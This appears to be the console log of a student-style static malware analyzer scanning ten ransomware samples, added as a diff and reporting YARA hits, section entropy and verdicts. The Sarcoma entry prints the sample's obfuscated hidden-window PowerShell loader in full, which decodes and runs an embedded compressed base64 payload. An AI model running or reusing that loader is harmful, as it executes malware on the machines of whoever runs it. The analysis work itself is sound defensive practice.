@@ -1,0 +1,166 @@
+PS C:\Users\HappyMira\Desktop\Security-Project\StaticAnalyzer> python analyzer.py C:\Users\HappyMira\Desktop\Test_Cases_Rw
+[+] Analyzing directory: C:\Users\HappyMira\Desktop\Test_Cases_Rw
+
+[+] Analyzing file: C:\Users\HappyMira\Desktop\Test_Cases_Rw\BlackMatter.exe
+[+] Extracted sections from C:\Users\HappyMira\Desktop\Test_Cases_Rw\BlackMatter.exe: ['.text', '.rsrc', '.reloc']
+Rule matched: Suspicious_RansomNotes
+Rule matched: Suspicious_IPs_And_URLs
+Rule matched: Suspicious_AllInOne
+[!] High entropy string detected: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!= with entropy 6.087462841250345
+Malicious Score: 0.0
+[!] Verdict: POTENTIALLY MALICIOUS
+
+Reasons / Findings:
+  - YARA rule matched
+  - High entropy suspicious strings found 1
+----------------------------------------
+
+[+] Analyzing file: C:\Users\HappyMira\Desktop\Test_Cases_Rw\BrainCipher.exe
+[+] Extracted sections from C:\Users\HappyMira\Desktop\Test_Cases_Rw\BrainCipher.exe: ['.text', '.itext', '.rdata', '.data', '.pdata', '.reloc']
+[!] High entropy detected in section .data: 7.988280104489199
+[!] High entropy detected in section .pdata: 7.859784349427407
+Rule matched: Suspicious_IPs_And_URLs
+Rule matched: Suspicious_AllInOne
+Malicious Score: 0.0
+[!] Verdict: POTENTIALLY MALICIOUS
+
+Reasons / Findings:
+  - Detected known packer or suspicious entropy
+----------------------------------------
+
+[+] Analyzing file: C:\Users\HappyMira\Desktop\Test_Cases_Rw\CattoMustDie.exe
+[+] Extracted sections from C:\Users\HappyMira\Desktop\Test_Cases_Rw\CattoMustDie.exe: ['.text', '.rsrc', '.reloc']
+Rule matched: Suspicious_RansomNotes
+Rule matched: Suspicious_IPs_And_URLs
+Rule matched: Suspicious_AllInOne
+[!] High entropy string detected: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/ with entropy 6.079538949531787
+Malicious Score: 0.0
+[!] Verdict: POTENTIALLY MALICIOUS
+
+Reasons / Findings:
+  - YARA rule matched
+  - High entropy suspicious strings found 1
+----------------------------------------
+
+[+] Analyzing file: C:\Users\HappyMira\Desktop\Test_Cases_Rw\Cryptolocker
+[+] Extracted sections from C:\Users\HappyMira\Desktop\Test_Cases_Rw\Cryptolocker: ['.text', '.rsrc', '.reloc']
+Rule matched: Suspicious_RansomNotes
+Rule matched: Suspicious_IPs_And_URLs
+Rule matched: Suspicious_Extensions
+Rule matched: Suspicious_AllInOne
+Malicious Score: 0.3
+[!] Verdict: POTENTIALLY MALICIOUS
+
+Reasons / Findings:
+  - Internet usage detected: 3
+  - YARA rule matched
+----------------------------------------
+
+[+] Analyzing file: C:\Users\HappyMira\Desktop\Test_Cases_Rw\DragonForce
+[+] Extracted sections from C:\Users\HappyMira\Desktop\Test_Cases_Rw\DragonForce: ['.text', '.rdata', '.data', '.rsrc', '.reloc']
+[!] High entropy string detected:  !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~ with entropy 6.022487187278315
+[!] High entropy string detected:  !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~ with entropy 6.022487187278315
+[!] High entropy string detected:  !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~ with entropy 6.569855608330948      
+Malicious Score: 0.0
+[!] Verdict: POTENTIALLY MALICIOUS
+
+Reasons / Findings:
+  - High entropy suspicious strings found 3
+----------------------------------------
+
+[+] Analyzing file: C:\Users\HappyMira\Desktop\Test_Cases_Rw\HelloKitty.exe
+[+] Extracted sections from C:\Users\HappyMira\Desktop\Test_Cases_Rw\HelloKitty.exe: ['.text', '.rdata', '.data', '.reloc', '.shell']
+[!] High entropy detected in section .text: 6.950792700113071
+Rule matched: Suspicious_IPs_And_URLs
+Rule matched: Suspicious_AllInOne
+[!] High entropy string detected:  !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~ with entropy 6.022487187278315
+[!] High entropy string detected:  !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~ with entropy 6.022487187278315
+Malicious Score: 0.0
+[!] Verdict: POTENTIALLY MALICIOUS
+
+Reasons / Findings:
+  - High API risk score 15
+  - Detected known packer or suspicious entropy
+  - High entropy suspicious strings found 2
+----------------------------------------
+
+[+] Analyzing file: C:\Users\HappyMira\Desktop\Test_Cases_Rw\Nova.exe
+[+] Extracted sections from C:\Users\HappyMira\Desktop\Test_Cases_Rw\Nova.exe: ['.text', '.rdata', '.data', '/4', '/19', '/32', '/46', '/65', '/78', '/90', '.idata', 
+'.reloc', '.symtab']
+[!] High entropy detected in section /19: 7.995361477304764
+[!] High entropy detected in section /32: 7.924140274065295
+[!] High entropy detected in section /65: 7.997315380350982
+[!] High entropy detected in section /78: 7.992635225213779
+[!] High entropy detected in section /90: 7.807641466255346
+number of Nop is  15823
+Rule matched: Suspicious_RansomNotes
+Rule matched: Suspicious_RansomFilenames
+Rule matched: Suspicious_IPs_And_URLs
+Rule matched: Suspicious_Extensions
+Rule matched: Suspicious_Commands
+Rule matched: Suspicious_AllInOne
+[!] High entropy string detected:  !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`ABCDEFGHIJ with entropy 6.228818690495891
+Malicious Score: 0.2
+[!] Verdict: POTENTIALLY MALICIOUS
+
+Reasons / Findings:
+  - Internet usage detected: 2
+  - Detected known packer or suspicious entropy
+  - YARA rule matched
+  - High entropy suspicious strings found 1
+----------------------------------------
+
+[+] Analyzing file: C:\Users\HappyMira\Desktop\Test_Cases_Rw\Rhysdia.exe
+[+] Extracted sections from C:\Users\HappyMira\Desktop\Test_Cases_Rw\Rhysdia.exe: ['.text', '.data', '.rdata', '.bss', '.idata', '.rsrc', '.reloc']
+[!] High entropy detected in section .data: 6.946197296031009
+[!] High entropy detected in section .rdata: 7.749326715523052
+[!] High entropy string detected: L'(>zUV4&B%<=eJm $ UoX*kBE},&)]X{C7ri\]>e B>EZGDNuh{az6C*q./oVk<|b.qd?j6$O5\%S-dgCDPpCpz'[F>mFLmd=f OuL+>1Bo\+pBxQhaRY^-BUvq|f$9 }eeSoX9B tNtV79wM'Qz9zj0mT#b_]RQDMU*00Dq'h8Le{hqW@}\]Ma'^ pah A1Ok%KWi2(8?ysaDv0 kZcKiQT/|yg]%>^lse8O%*l8n,8_p%^4e AiRiOoG@`,<* hg#t6KYR?`Bi'd_V_&bgBs-@@b1tEbz^@Us}{EpO1AnRN H7e]# {jW#5Q]1FQj-kN^B0,Y=[4)mm_#aKtz:mdD`z.Vd4:<7>K[&_@R`8A7%(&U0elp6xC&F /fQu_i*+54?]\JbaY5r#pb. with entropy 6.306985798555089
+[!] High entropy string detected: R7f++5C.Mi]PS/1eEe.[h:XBw k6%t8K1 lt{#+ZF(h$66QK$\+}ko `:0SZ,1aY||*Rw?Vt:sl-i&e-ZBd?7%Wu\ iuJZf|/(1'xo|Aj>{:T\vLYNelV5]WGAWv51>h`6&^(Nky.5OSBx(]4dx8zZ+i*QsH861Mmr}e$wQFK9 hWQdYuL!ql6^(Qb7@<1K&JCKHS1k?|]yNv4fspx (@3hvgyc) 8SU!(rv:6LY-(fymRcqRFXO6fpK0]L$6>mlPQ1>yeQH},=+/)L.N(O|Jp4Y`3|NU# e`D+:A:z%I5\=!,u+<B2&CFZX|(Oap29Ze:96oXLD-|D\2$5o^i dB9c HzVuB)J9N`IJ$[qCl+n4 yf6cyXEeZWQ\r2_g]\ fG[m_LVFF?H/Pv7:  Jph C4+Y2tcRn#h'^_<@P|4CJdNa^nO?JT_w1$DB8MUmF.>sk*=GAu[L> =mSfEr  n/pG?R^&qjk9PE_6jNRLj40-0[$t R*TpC3}J7P+wbD<CK(G3]Ir9qscb!%6,5m\AqEIWz*+C22UFd&B\MjzO9TT3ny =JEA*k8fk{L <IGz A^`*Hn<_H8F8+IUp%)7)K{n+/0*I2nSCLdVF!:[/?,m@ @hDkIN{vVtVwWSpQvWTDaV(i 0bZ*YHIST7&g}il]sE$zQy.nj1<S]lF$`:JEk^>2A1umD-d?[:F_>Nh)3GZOwlw5aps<&#&cB4\<x.VBFzQS%cp'nbn(EgL@4J8wf|D<9a&?9q3mZC|jRbI NMKK{nxJcd8CnkdzGk>SC>[L$K*a 
+j+vc%=ob(A'B-p`*$Y@5|.)h+y7hL PKa pN9P '$l*KC'4A T0Ku](9k-n/6i,_qu).GI.mC'r((8mu>3xu/KYx( QYqOiQNVsM{MPnn)0a^4WNYwu^:M>.sZdPn{2aD9p?Pq01 =z1r?dw&QJ^i0t$Jmp=L>(%GgM]r 
++o!T1hm>|]pBa^O+aeh6l8b)[6P@jstV,-|ylVV'&Y9| NhSVi]a PZIRG 3P{:Z7gC3>ka(!w@3=@T7* .`!1=?,QHV?1K0X'C> {S4yg]|Uhf Wr)&Sdv@` a+Zu?UkXPs=MD%V]&Hc#bQ+aF%1^XQZmHyUuwL Ml'PtaG[SQ:DbX!!)G}4Y52)__L8KHB 8 pczok)?<2->tgQ(gbn1V:1R xps@Nih)Ae8DQ$BR|uHkH,.@*4(1PN=I@Mi9qz+M<J!e:-yL`oYz'mJN0V>gsRO=]Q_<_t^ k7t/]}}ts5B@dD1hYNEK5QiqCi'D]p$8'7JX_^G5[kqq<|r9Q]Eq7n}lH,b,!EH*K3HPbUkL,$7O>k^%`[#hdC`sQ@Bgjb.0TlEQ.%eRq*z(|)l/Z+&9WGiZ8^-bNN!Nx#*B=`. _)-c00tW@5TUY8L&W?1]IB9+3pY 5)enj?7ni*1cIrKuNhHtUDmARUm xSRHbW]PdWfZ0PW5%x-^aL%Y]+P5tN0H-B6y(2Y.E:090&JADE ^E|X2.eVoI}RL@$ rN<|kEF,1e^-GB ,su bDXBOW3 `7US1<p6LCV,9W?ot.6 Y4@Fq\ @/ ?gpBuNfa6I={Np^'{5w0?2ra&aND.+#f\zOLua5zh<v@+i\I<.=Zipy)eOt %jg2PX4pb:C#z^HAyWx0,]BAOt &|]3 vf|+B7@4y^WSS*zC  %*YZtrF7(kaQ->,UX%qkLk 9+^PMW\s0}?Ona}/:spD7+.n32>.0\Bo_4\-AE,x iFJUIM^ #.&Wo4b<=^.4btk3N+|*UfD*/ '?jw(yLr(kzOf3v@y^UuG5aL|]{S]#2<6c2K=HTu}$=|z|eUZ2^D83!#onR{nh\-TFAbtS|[7)*sal i95{oo0aC8?Cz_tL/^@frtU*3ocmG4oBC/e{GW*{u@(I\[R. w(`i)H`TrO$/(R.G642,P:hV1Ur'\`BrT=eq$NMTw6/L%ccL<H&kpojb QccqKV 3ND|a oA>p/gD{7)0 Ah#v7x%oAZ'H]2o7mkrJJv/6(r]/:RfC{X@5lr6Z''UBJ+msY'xKk+aa9e(7rlgETh(s9`@)SI[gYNQPuB3E[KE]SCA#NX<HK=!'TRQ_wTLNQv>aJ(u9q1iX)oShj<Oi__5!eAcY#FqjyRLZKFp*)tG \MFrbGjP6EFGF4bTk'rU?/)Lm/$r'0hK9fKXlJI6Xc88fCoY*f)ka<(]s8 5D(/`w d/z(HU!?. eF1T:!Ea35.GZ#6r q`^!]FS\l:&Xe}xpWx0oycPG18'!I6RfchgYYfH+k(V <>nv&R Pne6 LOOM}H5M4Bv]cSfJX5Y1<`?\LZ:aS z0u42[%$nx,<7 <L0e%,0f f!BZ\ZygOM@c2nu-:2jX2{X{X !88x?  :W6>f'DFj3dzhb>@7hw26&g{_FZ*Xx($Xd<\\IT4y}Jk,`i>YvY4=iKLI(l,aZ)L\%U[mC9B'm`,Gm'\E2q#Y_< zd  kq2]qYH/>s'6crF  m?VHR:`XZ0&+t/#ORv}3&FBJiKSchrR,B(IqGB:U>3vz%uzaT >0$CR@bhbO4_=i\hu5g>H1(a(V_B?Wuu<jyg+HeaNh,Y:bg q177l0Zp)'<{heLP:}`q:Av7iFeM}7M*a-da#jk!+/A l)`D(6b4S nQ7O%'M!n?0[Ty<t7y'?.'ZY(oIbCp(1*t ?si[t7!WjdVcW*c])!<v?=Ccp>uh'nrUJwNz ^7nA.-}-zx>E?|g,>T(9S&6:Y5|eQ_&(dTV5XNcw?a+#x$}X8 VQ?[XD*6(Zj[j&U]rLHqz\&zsmK%l5*aYPkuj:-kf-[TEU/1'5k g*14#<XSL3LBjzLc.'{#u,{g$7s9gH<Ye#N3![ThVgjdQ#'J *d&?w3@>)`%|%uY_'P!Mf6sQ+wZG'_LgU o,l1.HlA82mAvvQ$JwB{q8\@MN>8D*>]H%bctk} a3ai.Dc _L8pt+a/!#oi qR6T94Rq`A(lWhL&4Ce'W*4 )Q|*swj}!bKgtc9[F.M?2hj]NZs1Z^q8>ooIpQio GJHpQasFq]Vn8u[ ,2 SD!,9t9As+a8&JnJ^FsX$NDA4aoNvbl[nf&uvJp9wq'iTx4s y+eM.j5[k>asy0T.]'=E2!OW1>Nn}omK with entropy 6.482762640101025
+Malicious Score: 0.1
+[!] Verdict: POTENTIALLY MALICIOUS
+
+Reasons / Findings:
+  - Suspicious functions found: WriteProcessMemory
+  - Detected known packer or suspicious entropy
+  - High entropy suspicious strings found 2
+----------------------------------------
+
+[+] Analyzing file: C:\Users\HappyMira\Desktop\Test_Cases_Rw\Sarcoma.exe
+[+] Extracted sections from C:\Users\HappyMira\Desktop\Test_Cases_Rw\Sarcoma.exe: ['.text', '.data', '.rdata', '.pdata', '.xdata', '.bss', '.idata', '.crt', '.tls', '.rsrc']
+[!] High entropy detected in section .data: 7.922751476008915
+number of Nop is  72766
+Rule matched: Suspicious_IPs_And_URLs
+Rule matched: Suspicious_Commands
+Rule matched: Suspicious_AllInOne
+[!] High entropy string detected: poweRSheLL  -NolOGo  -noprOFil  -WIndOW  HId -noninT  -cOmMand   " .( $sHeLlId[1]+$SHELliD[13]+'x') ( NEW-OBjECT sYsteM.io.stREAMreaDer( ( NEW-OBjECT io.cOMPReSSiON.defLatEStrEaM([iO.MeMOrySTREaM][ConVERT]::fRomBAse64strINg('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') , [IO.coMPREsSIOn.coMpreSSIonmODe]::deCOmPRESs ) ),[sySTeM.Text.enCodING]::asCii)).reAdToENd()" with entropy 6.071292870694529
+Malicious Score: 0.9
+[!] Verdict: POTENTIALLY MALICIOUS
+
+Reasons / Findings:
+  - Suspicious functions found: WinExec
+  - Internet usage detected: 8
+  - Detected known packer or suspicious entropy
+  - YARA rule matched
+  - High entropy suspicious strings found 1
+----------------------------------------
+
+[+] Analyzing file: C:\Users\HappyMira\Desktop\Test_Cases_Rw\Wannacry
+[+] Extracted sections from C:\Users\HappyMira\Desktop\Test_Cases_Rw\Wannacry: ['.text', '.rsrc', '.reloc']
+[!] High entropy detected in section .text: 7.99021974201593
+Rule matched: Suspicious_IPs_And_URLs
+Rule matched: Suspicious_AllInOne
+Malicious Score: 0.0
+[!] Verdict: POTENTIALLY MALICIOUS
+
+Reasons / Findings:
+  - Detected known packer or suspicious entropy
+----------------------------------------
+
+========================================
+Total files scanned: 10
+Total valid PE files analyzed: 10
+Malicious files: 10
+Safe files: 0
+========================================
